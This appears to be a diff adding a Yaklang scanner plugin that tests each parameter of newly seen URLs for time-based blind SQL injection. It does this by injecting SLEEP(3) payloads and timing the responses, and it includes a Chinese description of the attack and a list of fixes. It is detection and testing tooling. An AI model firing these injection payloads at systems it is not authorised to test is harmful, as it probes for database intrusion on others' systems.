@@ -1,0 +1,62 @@
+buildSqlPayload = (pre, suf) => {
+    return f"${pre}/**/And/**/SleeP(3)${suf}"
+}
+
+description = `
+SQL 时间盲注（Time-Based Blind SQL Injection）是一种针对数据库的攻击方式，攻击者利用数据库执行时间的差异来推断出数据库中的信息，而不需要直接获取数据库的反馈信息。这种攻击适用在被攻击的应用程序未能有效过滤用户输入以及未采取相应的安全措施的情况下。`
+solution = ``
+fixDesc = `
+1. 使用预处理语句和参数化查询：这是防止SQL注入攻击的一种有效方法。预处理语句和参数化查询可以确保用户输入被正确地解释为字面值，而不是SQL命令的一部分。
+2. 实施严格的错误处理：不应向用户公开详细的错误信息，以防止攻击者利用这些信息来理解数据库结构并构造有效的SQL注入攻击。
+3. 对用户输入进行严格验证：所有用户输入都应该被视为潜在的攻击载荷，并进行严格的验证和清理。
+4. 限制数据库账户的权限：数据库账户应只具有执行其需要的任务所必需的最小权限。这样可以减少攻击者在成功注入SQL命令后可以执行的操作。
+5. 使用Web应用防火墙（WAF）：WAF可以帮助识别和阻止SQL注入攻击，增加了一个额外的防御层。
+6. 定期进行安全审计和渗透测试：这可以帮助检测和修复可能被攻击者利用的任何漏洞。
+7. 保持数据库软件和应用程序的更新：这是防止漏洞被利用的重要措施，因为许多更新都包含了对已知漏洞的修复。`
+
+# mirrorNewWebsitePathParams 每新出现一个网站路径且带有一些参数，参数通过常见位置和参数名去重，去重的第一个 HTTPFlow 在这里被调用
+mirrorNewWebsitePathParams = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
+    rsp, _ = poc.HTTPEx(req, poc.https(isHttps))~
+    t = rsp.TraceInfo.GetServerDurationMS()
+
+
+    freq = fuzz.HTTPRequest(req, fuzz.https(isHttps))~
+    for p in freq.GetCommonParams() {
+        val := p.GetFirstValue()
+        isNum = str.IsDigit(val)
+        var suffix = [" -- "]
+        var prefix = []
+        if isNum {
+            prefix.Push(f`${val}`)
+            prefix.Push(f`${val}'`)
+        } else {
+            prefix.Push(f`${val}'`)
+            prefix.Push(f`${val}')`)
+            prefix.Push(f`${val}'))`)
+        }
+        for suf in suffix {
+            for pre in prefix {
+                payload := buildSqlPayload(pre, suf)
+                result, err := p.Fuzz(payload).ExecFirst()
+                if err != nil { continue }
+                if  result.ServerDurationMs > t + 3000 {
+                    risk.NewRisk(
+                        url,
+                        risk.severity("high"),
+                        risk.type("sqlinjection"),
+                        risk.title(f"SQL Time-Blind-Based Injection: ${url}"),
+                        risk.titleVerbose(f"SQL时间盲注（Sleep）：: ${url}"),
+                        risk.parameter(f`Param: ${p.Name()} OriginValue: ${val}`),
+                        risk.payload(f`Payload: ${payload}`),
+                        risk.request(result.RequestRaw),
+                        risk.response(result.ResponseRaw),
+                        risk.description(description),
+                        risk.solution(solution),
+                    )
+                    return
+                }
+            }
+        }
+    }
+}
+
